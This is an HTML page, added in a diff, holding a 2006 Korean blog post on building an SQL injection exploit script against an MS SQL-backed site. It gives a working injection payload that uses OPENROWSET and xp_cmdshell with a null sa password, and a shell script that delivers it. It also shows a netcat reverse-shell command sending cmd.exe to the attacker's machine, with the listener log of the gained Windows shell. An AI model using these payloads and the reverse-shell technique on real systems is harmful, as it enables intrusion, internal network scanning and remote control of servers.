@@ -1,0 +1,50 @@
+<!DOCTYPE html><html lang="ko"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1"><title>[웹보안] sql 인젝션용 스크립트 제작    · 심플하고 여유있는 삶</title><meta name="description" content="sql 인젝션용 스크립트 제작 SQL 인젝션을 익스플로잇하기 위한 스크립트 제작 vulnerablesite.com의 웹 서버는 MS SQL 데이터베이스에 sa 권한으로 접속하지 않았다. 따라서 바로…"><link rel="canonical" href="https://j1h0.github.io/blog/posts/2006/060616-60025334395/"><link rel="alternate" type="application/rss+xml" title="심플하고 여유있는 삶" href="/blog/rss.xml"><link rel="icon" href="/blog/favicon.svg" type="image/svg+xml"><meta property="og:type" content="article"><meta property="og:title" content="[웹보안] sql 인젝션용 스크립트 제작   "><meta property="og:description" content="sql 인젝션용 스크립트 제작 SQL 인젝션을 익스플로잇하기 위한 스크립트 제작 vulnerablesite.com의 웹 서버는 MS SQL 데이터베이스에 sa 권한으로 접속하지 않았다. 따라서 바로…"><meta property="og:url" content="https://j1h0.github.io/blog/posts/2006/060616-60025334395/"><meta property="og:site_name" content="심플하고 여유있는 삶"><meta name="color-scheme" content="light dark"><script>
+    // 테마는 렌더 전에 정한다(깜빡임 방지). 저장소 접근이 막히면 시스템 설정을 따른다.
+    (function () {
+      var s = null;
+      try { s = localStorage.getItem('theme'); } catch (e) {}
+      var t = s === 'light' || s === 'dark' ? s
+        : (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches ? 'dark' : 'light');
+      document.documentElement.setAttribute('data-theme', t);
+    })();
+  </script><link rel="stylesheet" href="/blog/_astro/BaseLayout.CoPArwrU.css"></head><body><a class="skip" href="#main">본문으로 건너뛰기</a><header class="site-header"><div class="wrap header-row"><a class="brand" href="/blog/">심플하고 여유있는 삶</a><nav aria-label="주 메뉴"><a href="/blog/" aria-current="page">글</a><a href="/blog/category/">카테고리</a><a href="/blog/archive/">보관함</a><a href="/blog/search/">검색</a></nav><button id="theme-toggle" type="button" aria-label="화면 색 바꾸기" title="화면 색 바꾸기"><svg class="i-moon" viewBox="0 0 24 24" width="18" height="18" aria-hidden="true"><path d="M21 12.8A9 9 0 1 1 11.2 3a7 7 0 0 0 9.8 9.8z" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linejoin="round"></path></svg><svg class="i-sun" viewBox="0 0 24 24" width="18" height="18" aria-hidden="true"><circle cx="12" cy="12" r="4.2" fill="none" stroke="currentColor" stroke-width="1.8"></circle><path d="M12 2.5v2.4M12 19.1v2.4M2.5 12h2.4M19.1 12h2.4M5.2 5.2l1.7 1.7M17.1 17.1l1.7 1.7M5.2 18.8l1.7-1.7M17.1 6.9l1.7-1.7" stroke="currentColor" stroke-width="1.8" stroke-linecap="round"></path></svg></button></div></header><main id="main" class="wrap"><article class="post" data-pagefind-body><header class="post-head"><p class="meta"><a href="/blog/category/%5B%EC%A2%85%EB%A3%8C%5D%EA%B0%9C%EB%B0%9C%20%ED%8C%81%20%EC%A0%95%EB%A6%AC/" data-pagefind-filter="category">[종료]개발 팁 정리</a>· <time datetime="2006-06-16T05:03:00.000Z" data-pagefind-meta="date:2006-06-16">2006.06.16.</time></p><h1>[웹보안] sql 인젝션용 스크립트 제작   </h1></header><div class="prose"><p><strong>sql 인젝션용 스크립트 제작</strong></p>
+<p>SQL 인젝션을 익스플로잇하기 위한 스크립트 제작<br>
+vulnerablesite.com의 웹 서버는 MS SQL 데이터베이스에 sa 권한으로 접속하지 않았다. 따라서 바로 스토어드 프로시저 실행과 같은 상위 권한이 필요한 작업들은 실행이 불가능했다. 따라서 다음과 같이 다른 MS SQL 서버에 접속해 명령을 실행하는 스크립트를 짜고 여러 서버에 대해 명령을 실행해 보았다. 해당 서버에서 명령 실행이 잘 됐는지 여부는 ping이나 telnet으로 공격자의 컴퓨터로 패킷을 보내도록 하고, tcpdump로 그 패킷을 모니터링하는 방법이 많이 쓰인다. 바로 웹 페이지에서 명령 실행 결과를 볼 수 있는 경우는 거의 없다.</p>
+<p>두 번째 줄의 프로그램의 첫 번째 인자는 공격 대상이 되는 호스트의 이름이나 주소이고, 네 번째 줄의 나머지 인자는 실행할 명령행이다. 다섯 번째 줄에서는 lynx를 사용해 대상 호스트에 접속한다. 실제로 vulnerablesite.com의 MS SQL 서버에서 실행하려는 쿼리는 다음과 같다.</p>
+<p>select * from OPENROWSET(‘SQLoledb’,’uid=sa;pwd=;Network=DBMSSOCN;Address=$host,1433;’,’<br>
+SET FMTONLY OFF execute master..xp_cmdshell “$cmd”’)</p>
+<p>이 쿼리는 데이터베이스에서 대상 $host의 MS SQL 데이터베이스에 sa 권한으로 널 패스워드로 접속해 $cmd 명령을 실행하라는 의미다. 대상 $host의 MS SQL 데이터베이스의 sa에 패스워드가 걸려 있지 않다면 이 스크립트는 성공할 것이다. $host를 변화시켜 가면서 취약한 MS SQL 서버를 찾아서 내부 망을 스캐닝해 볼 수도 있다.</p>
+<p>[리스트 1] exec.sh 분석</p>
+<p>1: #!/bin/sh<br>
+2: host-$1<br>
+3: shift<br>
+4: cmd='echo $@|sed "s/ /+/g"'<br>
+5: lynx -dump <a href="http://vulnerablestie.com/test/aaa_detail.asp?code=">http://vulnerablestie.com/test/aaa_detail.asp?code=</a><br>
+000&#x26;id=20030121114206'select+*from+OPENROWEST( 'SQLoledb' ,'<br>
+uid=sa;pwd=;Network=DBMSSOCN;Address=$host,1433;' ,'<br>
+SET+FMTONLY+OFF+execute+master..xp_cmdshell+"$cmd"')--<br>
+&#x26;gotopage=l&#x26;idx=000&#x26;ref=73&#x26;re_step=0&#x26;re_level=0"</p>
+<p>2단계 | 명령 셸 획득<br>
+netcat을 다운로드하고 리버스 커넥션을 통해 명령 셸에서 작업할 수 있었다. 방화벽이 있어서 외부에서 내부 시스템에 접근하기 힘들 것이라고 생각한다면 오산이다. 대부분 방화벽은 외부에서 내부 망으로의 직접적인 공격을 막도록 설계되어 있다. 하지만 내부 망에서 외부로 나가는 트래픽은 거의 통제하지 못하는 실정이고, 애플리케이션 레벨의 프로토콜에 대해 분석할 수 있는 기능이 없으므로 80번 웹 포트와 같이 일반적인 포트를 사용해 외부로 접근할 경우 거의 감지할 수 없다. nc를 구동해 cmd.exe를 실행하고 공격자의 컴퓨터로 그 제어권을 넘긴다.</p>
+<p>sh exec.sh 10.1.1.5 nc.exe -e cmd.exe &#x3C;erased for security reason> 9999</p>
+<p>nc를 통해 셸을 얻고, 명령을 실행하는 모습이다. 일반적인 명령행의 명령들은 모두 실행할 수 있다.</p>
+<p>tester:~/# nc -l -vv -p 9999<br>
+listening on [any] 9999 ...<br>
+&#x3C;erased for security reason>: inverse host lookup failed: Unknown host<br>
+connect to [&#x3C;erased for security reason>] from (UNKNOWN) [&#x3C;erased for security reason>] 1173<br>
+Microsoft Windows 2000 [Version 5.00.2195]</p>
+<p>(C) Copyright 1985-2000 Microsoft Corp.</p>
+<p>C:WINNTsystem32>ipconfig<br>
+ipconfig</p>
+<p>Windows 2000 IP Configuration</p>
+<p>Ethernet adapter 로컬 영역 연결:</p>
+<p>Connection-specific DNS Suffix . :</p>
+<p>IP Address. . . . . . . . . . . . : &#x3C;erased for security reason></p>
+<p>Subnet Mask . . . . . . . . . . . : &#x3C;erased for security reason></p>
+<p>Default Gateway . . . . . . . . . : &#x3C;erased for security reason></p></div><p class="origin" data-pagefind-ignore><a href="https://blog.naver.com/jih08hin/60025334395" rel="noopener">네이버 블로그 원문</a></p></article><nav class="post-nav" aria-label="이전 글과 다음 글" data-pagefind-ignore><a class="older" href="/blog/posts/2006/060605-60024981421/"><span>이전 글</span>[델파이-WinAPI] 캡션바 없는 폼 드래그앤드롭으로 이동(WM_NCHITTEST)</a><a class="newer" href="/blog/posts/2006/060707-60026016053/"><span>다음 글</span>[공유] [설치/설정] APM(Apache 2.2.2 + PHP 5.1.4 + MySQL 5...</a></nav></main><footer class="site-footer"><div class="wrap footer-row"><span>심플하고 여유있는 삶</span><span class="links"><a href="/blog/rss.xml">RSS</a><a href="https://j1h0.github.io/" rel="noopener">CV</a></span></div></footer><script>
+    document.getElementById('theme-toggle').addEventListener('click', function () {
+      var cur = document.documentElement.getAttribute('data-theme') === 'dark' ? 'light' : 'dark';
+      document.documentElement.setAttribute('data-theme', cur);
+      try { localStorage.setItem('theme', cur); } catch (e) {}
+    });
+  </script></body></html>
